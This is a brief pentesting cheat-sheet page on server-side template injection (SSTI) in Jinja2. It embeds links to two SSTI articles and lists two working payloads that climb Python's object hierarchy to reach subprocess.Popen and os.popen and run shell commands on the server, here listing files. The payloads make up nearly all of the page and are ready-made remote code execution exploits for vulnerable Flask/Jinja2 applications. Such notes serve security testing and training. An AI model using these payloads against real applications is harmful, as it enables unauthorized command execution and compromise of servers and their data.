# SSTI

{% embed url="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2" %}

{% embed url="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" %}

```
#subproces
{{ ''.__class__.__mro__[1].__subclasses__()[223]('ls ./* -lah', shell=True, stdout=-1).communicate()[0].decode('utf-8') }}
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```

